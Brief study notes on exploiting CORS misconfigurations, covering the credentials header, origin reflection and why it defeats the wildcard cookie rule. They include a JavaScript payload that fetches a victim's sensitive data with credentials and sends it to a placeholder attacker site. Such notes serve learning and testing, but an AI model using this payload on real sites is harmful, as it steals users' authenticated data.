- Cross-Origin Resource Sharing is a relaxation to the Same-Origin Policy ( SOP ).
- NOT a protection mechanism.
- Enables controlled access to media/resources outside the domain.
- Invites cross-domain attacks.


# Indicator
A response contains the header `Access-Control-Allow-Credentials: true`
A request sent with `req.withCredentials = true` must always be to a server that returns that header.

### Possible Payload

```HTML
<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; // executes after response is received
req.open('get','https://victim-url/sensitive-data',true); // (method, url, async)
req.withCredentials = true;  // can only be set for sites that respond with the header
req.send(); 

function reqListener() { location='attacker-site/log?key='+this.responseText; }; // writes to specified url 
</script>
```


#### Subtle Point:

The mechanism is that if the ACAO ( Access-Control-Allow-Origin: ) is set to a `*`, you can NEVER send cookies ( browser blocks it ) for security reasons
[ wildcard means all sites can access data, but cookies must be confidential ]

When devs create logins, they hit this wall, and have to manually whitelist sites. But some get lazy and just configure the response to reflect whichever site made the request. This essentially makes it a wildcard that allows cookies.
